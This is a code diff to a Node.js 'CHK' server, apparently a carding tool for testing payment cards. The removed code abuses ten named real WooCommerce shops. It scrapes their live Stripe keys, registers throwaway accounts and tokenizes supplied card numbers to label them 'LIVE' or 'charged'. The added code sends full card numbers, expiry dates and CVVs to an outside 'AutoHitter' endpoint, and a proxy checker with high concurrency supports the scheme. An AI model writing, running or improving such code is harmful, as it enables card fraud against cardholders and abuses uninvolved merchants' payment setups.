@@ -3,7 +3,6 @@ const cors = require('cors');
 const path = require('path');
 const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
-const { CookieJar } = require('tough-cookie');
 const crypto = require('crypto');
 const https = require('https');
 
@@ -142,7 +141,7 @@ app.get('/api/bin-lookup', async (req, res) => {
   res.status(404).json({ error: 'BIN not found' });
 });
 
-// ─── PROXY CHECKER (For Shopify CHK) ───
+// ─── PROXY CHECKER ───
 async function testProxyList(proxies) {
   const liveProxies = [];
   const batchSize = 200; // Massive concurrency
@@ -285,187 +284,33 @@ app.post('/api/check-sites-api', async (req, res) => {
   res.json({ success: true, cleanSites });
 });
 
-// ─── STRIPE AUTH 0$ (100% PROXY-FREE, ULTRA FAST) ───
-const STRIPE_SITES = [
-  "https://innercitytigers.com",
-  "https://www.professionalmarine.eu",
-  "https://www.domainegayda.com",
-  "https://ecolution-hubs.co.uk",
-  "https://shop.nemaneide.com",
-  "https://www.thebotanicalco.com",
-  "https://www.thevintagemariner.com",
-  "https://www.livealoha.com",
-  "https://www.shoppetz.com",
-  "https://www.modernboho.com"
-];
-
-const NONCE_PATTERNS = [
-  /"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"/,
-  /"createSetupIntentNonce"\s*:\s*"(.*?)"/,
-  /"ajax_nonce"\s*:\s*"([a-f0-9]+)"/,
-  /wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"/,
-  /id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"/,
-  /"_ajax_nonce"\s*:\s*"([a-f0-9]+)"/,
-  /"nonce"\s*:\s*"([a-f0-9]+)"/,
-];
-
-function isBadBody(text) {
-  if (!text) return true;
-  const s = String(text).trim();
-  if (["", "0", "null", "false", "-1", "undefined"].includes(s.toLowerCase())) return true;
-  if (s.startsWith('{') && s.endsWith('}')) {
-    try {
-      const j = JSON.parse(s);
-      if (!j || Object.keys(j).length === 0) return true;
-      if (j.success === false && !j.data) return true;
-    } catch (e) {}
-  }
-  return false;
-}
-
-function classifyStripeResponse(text) {
-  if (isBadBody(text)) return { Response: 'Empty AJAX (session mismatch)', Gateway: 'Stripe-Auth2', Price: '$0' };
-  const rl = text.toLowerCase();
-  
-  const errMatch = text.match(/"decline_code"\s*:\s*"([^"]+)"/) || text.match(/"message"\s*:\s*"([^"]+)"/) || text.match(/"code"\s*:\s*"([^"]+)"/);
-  const errMsg = errMatch ? errMatch[1].toUpperCase() : '';
-
-  if (/"(success|status)"\s*:\s*"?(true|succeeded)"?/i.test(rl) || rl.includes('payment method added')) {
-    if (rl.includes('decline') || rl.includes('card_declined')) return { Response: errMsg || 'CARD_DECLINED', Gateway: 'Stripe-Auth2', Price: '$0' };
-    return { Response: 'Payment Method Added Successfully', Gateway: 'Stripe-Auth2', Price: '$0' };
-  }
-  if (/requires_action|authentication_required|3d_secure|requires_confirmation|redirect_to_url/i.test(rl)) return { Response: 'LIVE · 3DS Required', Gateway: 'Stripe-Auth2', Price: '$0' };
-  if (rl.includes('card_not_supported')) return { Response: 'card_not_supported', Gateway: 'Stripe-Auth2', Price: '$0' };
-  if (/incorrect_cvc|incorrect_zip|insufficient_funds|invalid_cvc|cvc_check_failed/i.test(rl)) return { Response: errMsg || 'CCN LIVE', Gateway: 'Stripe-Auth2', Price: '$0' };
-  if (/card_declined|generic_decline|do_not_honor|fraudulent|lost_card|stolen_card|pickup_card|restricted_card|transaction_not_allowed|security_violation/i.test(rl)) return { Response: errMsg || 'CARD_DECLINED', Gateway: 'Stripe-Auth2', Price: '$0' };
-  if (rl.includes('expired_card') || rl.includes('expired')) return { Response: 'EXPIRED_CARD', Gateway: 'Stripe-Auth2', Price: '$0' };
-  if (/velocity|too_many|rate_limit/i.test(rl)) return { Response: errMsg || 'VELOCITY_EXCEEDED', Gateway: 'Stripe-Auth2', Price: '$0' };
-  if (errMsg) return { Response: errMsg, Gateway: 'Stripe-Auth2', Price: '$0' };
-
-  return { Response: 'Unknown Response', Gateway: 'Stripe-Auth2', Price: '$0' };
-}
-
-async function tryStripeSite(siteUrl, cc, mm, yy, cvv) {
-  const siteDomain = siteUrl.replace(/^https?:\/\//, '').replace(/\/+$/, '');
-  const email = `${randStr(10)}@gmail.com`;
-  const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36';
-  
-  const jar = new CookieJar();
-  const getCookies = async (url) => {
-    try { return (await jar.getCookies(url)).map(c => `${c.key}=${c.value}`).join('; '); } catch(e) { return ''; }
-  };
-  const setCookies = async (url, headers) => {
-    if (!headers) return;
-    for (const c of headers) { try { await jar.setCookie(c, url); } catch(e) {} }
-  };
-
-  try {
-    // 1. Get PK (Direct connection, no proxy)
-    let stripePk = null;
-    for (const url of [`${siteUrl}/my-account/add-payment-method/`, `${siteUrl}/my-account/`, `${siteUrl}/`]) {
-      try {
-        const r = await axios.get(url, { headers: { 'User-Agent': UA, Cookie: await getCookies(url) }, httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true });
-        await setCookies(url, r.headers['set-cookie']);
-        if (r.status === 403) return { Response: 'CF_BLOCK', Gateway: 'Stripe', Price: '$0' };
-        const m = r.data.match(/pk_live_[a-zA-Z0-9]{20,}/);
-        if (m) { stripePk = m[0]; break; }
-      } catch (e) {}
-    }
-    if (!stripePk) return { Response: 'NO_PK', Gateway: 'Stripe', Price: '$0' };
-
-    // 2. Get Reg Nonce
-    let regNonce = null;
-    for (const p of ['/my-account/', '/register/']) {
-      try {
-        const url = `${siteUrl}${p}`;
-        const r = await axios.get(url, { headers: { 'User-Agent': UA, Cookie: await getCookies(url) }, httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true });
-        await setCookies(url, r.headers['set-cookie']);
-        const m = r.data.match(/name="woocommerce-register-nonce"\s+value="([^"]+)"/) || r.data.match(/id="woocommerce-register-nonce"[^>]*value="([^"]+)"/);
-        if (m) { regNonce = m[1]; break; }
-      } catch (e) {}
-    }
-    if (!regNonce) return { Response: 'NO_REG_NONCE', Gateway: 'Stripe', Price: '$0' };
-
-    // 3. Register
-    const regUrl = `${siteUrl}/my-account/`;
-    const regData = new URLSearchParams({ email, '_wp_http_referer': '/my-account/', 'register': 'Register', 'woocommerce-register-nonce': regNonce }).toString();
-    const regRes = await axios.post(regUrl, regData, {
-      headers: { 'User-Agent': UA, Cookie: await getCookies(regUrl), 'Content-Type': 'application/x-www-form-urlencoded', Origin: siteUrl, Referer: regUrl },
-      httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true
-    });
-    await setCookies(regUrl, regRes.headers['set-cookie']);
-
-    const cookieStr = await getCookies(siteUrl);
-    if (!cookieStr.includes('wordpress_logged_in')) return { Response: 'REG_FAILED', Gateway: 'Stripe', Price: '$0' };
-
-    // 4. Get Setup Nonce
-    let nonce = null;
-    for (const p of ['/my-account/add-payment-method/', '/checkout/']) {
-      try {
-        const url = `${siteUrl}${p}`;
-        const r = await axios.get(url, { headers: { 'User-Agent': UA, Cookie: await getCookies(url) }, httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true });
-        await setCookies(url, r.headers['set-cookie']);
-        for (const pat of NONCE_PATTERNS) {
-          const m = r.data.match(pat);
-          if (m) { nonce = m[1]; break; }
-        }
-        if (nonce) break;
-      } catch (e) {}
-    }
-    if (!nonce) return { Response: 'NO_SETUP_NONCE', Gateway: 'Stripe', Price: '$0' };
-
-    // 5. Create PM (Direct)
-    const stripeData = `type=card&card[number]=${cc}&card[cvc]=${cvv}&card[exp_year]=${yy}&card[exp_month]=${mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[name]=John%20Doe&billing_details[email]=${email}&key=${stripePk}`;
-    const stripeRes = await axios.post('https://api.stripe.com/v1/payment_methods', stripeData, {
-      headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded' },
-      httpsAgent: fastHttpsAgent, timeout: 10000, validateStatus: () => true
-    });
-
-    if (stripeRes.data && stripeRes.data.error) {
-      const err = stripeRes.data.error;
-      const display = (err.decline_code || err.code || err.message || 'TOKENIZATION_FAILED').toString();
-      return { Response: display.toUpperCase(), Gateway: 'Stripe', Price: '$0' };
-    }
-
-    const pmId = stripeRes.data.id;
-    if (!pmId) return { Response: 'PM_FAILED', Gateway: 'Stripe', Price: '$0' };
-
-    // 6. Confirm Setup
-    let resultText = '';
-    for (const [url, params] of [[`${siteUrl}/`, { 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent' }], [`${siteUrl}/wp-admin/admin-ajax.php`, {}]]) {
-      try {
-        const body = new URLSearchParams({ action: 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-type': 'card', '_ajax_nonce': nonce }).toString();
-        const r = await axios.post(url, body, {
-          params, headers: { 'User-Agent': UA, Cookie: await getCookies(url), 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', Origin: siteUrl, Referer: `${siteUrl}/my-account/add-payment-method/` },
-          httpsAgent: fastHttpsAgent, timeout: 10000, validateStatus: () => true
-        });
-        resultText = r.data;
-        if (r.status === 200 && !isBadBody(resultText)) break;
-      } catch (e) {}
-    }
-    
-    if (isBadBody(resultText)) return { Response: 'BAD_AJAX', Gateway: 'Stripe', Price: '$0' };
-    return classifyStripeResponse(resultText);
-  } catch (err) {
-    return { Response: `NETWORK_ERROR`, Gateway: 'Stripe', Price: '$0' };
-  }
-}
-
+// ─── STRIPE AUTH 0$ (AutoHitter API) ───
 async function stripeAuth2Check(cardStr) {
   const parts = cardStr.split('|');
   if (parts.length !== 4) return { Response: 'Invalid card format', Gateway: 'Stripe-Auth2', Price: '$0' };
   let [cc, mm, yy, cvv] = parts.map(s => s.trim());
   if (yy.length === 2) yy = '20' + yy;
 
-  const sites = [...STRIPE_SITES].sort(() => Math.random() - 0.5);
-  for (const site of sites) {
-    try {
-      const result = await tryStripeSite(site, cc, mm, yy, cvv);
-      if (result && !['CF_BLOCK', 'NO_PK', 'NO_REG_NONCE', 'REG_FAILED', 'NO_SETUP_NONCE', 'PM_FAILED', 'BAD_AJAX', 'NETWORK_ERROR'].includes(result.Response)) {
-        return result;
-      }
-    } catch (e) {}
+  const targetUrl = new URL('https://sameric934-autohitter.hf.space/stripe/checkout-based/url/');
+  targetUrl.searchParams.append('card', `${cc}|${mm}|${yy}|${cvv}`);
+  targetUrl.searchParams.append('retries', '1');
+
+  try {
+    const response = await axios.get(targetUrl.toString(), {
+      headers: { 'User-Agent': 'Mozilla/5.0' },
+      timeout: 25000,
+      validateStatus: () => true,
+      httpsAgent: fastHttpsAgent
+    });
+
+    if (response.data) {
+      // The API returns the exact status (charged, declined, 3d, etc.)
+      return { Response: response.data.status || response.data.message || 'Unknown', Gateway: 'Stripe-Auth2', Price: '$0' };
+    }
+  } catch (e) {
+    console.log(`[Stripe] API Error: ${e.message}`);
   }
+
   return { Response: 'All sites failed (or blocked)', Gateway: 'Stripe-Auth2', Price: '$0' };
 }
 
@@ -571,7 +416,7 @@ async function processUserTask(email) {
   const processOne = async (cc) => {
     let resultObj, site = null;
     if (isStripe) {
-      const r = await stripeAuth2Check(cc); // Direct connection
+      const r = await stripeAuth2Check(cc); // Direct connection via AutoHitter
       resultObj = { displayLabel: r.Response, uiStatus: classifyStripeStatus(r.Response), message: r.Response, gateway: r.Gateway, raw: r };
     } else {
       const r = await checkShopifyCard(cc);
@@ -608,7 +453,7 @@ async function processUserTask(email) {
 
 function classifyStripeStatus(response) {
   const r = String(response || '').toUpperCase();
-  if (/PAYMENT METHOD ADDED|SUCCESS|CHARGED/.test(r)) return 'charged';
+  if (/PAYMENT METHOD ADDED|SUCCESS|CHARGED|ORDER_PAID/.test(r)) return 'charged';
   if (/LIVE|CCN|3DS|REQUIRES_ACTION/.test(r)) return 'live';
   if (/OTP|AUTHENTICATION/.test(r)) return 'otp';
   return 'declined';
